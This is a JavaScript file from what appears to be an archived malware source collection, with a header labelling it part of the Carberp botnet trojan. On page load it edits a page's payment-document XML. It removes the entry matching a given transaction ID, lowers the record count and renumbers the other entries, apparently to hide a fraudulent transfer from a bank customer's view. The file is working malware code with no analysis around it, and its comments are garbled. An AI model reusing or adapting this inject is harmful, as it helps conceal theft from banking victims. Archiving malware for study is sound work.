/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*��������� ���������, ��������� � ���� -> ��������� ���������*/
$(document).ready(function(){
	/*��� �������� �������������*/
	fix();
});
function fix()
{
	fixPayDoc();
}
function fixPayDoc()
{
	if(!document.getElementById("ScData"))
		return false;
		
	var xml = ScData.XMLDocument.documentElement;
	var elements = [];
	
	/*�������� ���-�� ����� ��������� �� 1*/
	var count = parseInt($(xml).attr("rcnt"))-1;
	$(xml).attr("rcnt", count);
	
	/*���������� ������������ -1*/
	if(parseInt($(xml).attr("eindex")) > count)
		$(xml).attr("eindex", count);
		
	/*����� �� ���� � �������� ������ ���� � ������*/
	$(xml.selectNodes('//DOC')).each(function(){
		elements.push($(this));
	});
	/*�.�. ���� ���� � �������� ������� ������������� ������*/
	elements = elements.reverse();
	
	/*����� �� ������� � ������ � ������ ���*/
	$.each(elements, function(key,val){
		var tID = parseInt(val.attr("N"));
		
		/*���� ���� ���������� - �������*/
		if(tID == trans_id)
			val.remove();
			
		/*���� ����� ����� - ��������� ����� �� 1*/
		if(tID > trans_id)
			val.attr("N", tID-1)
	});
}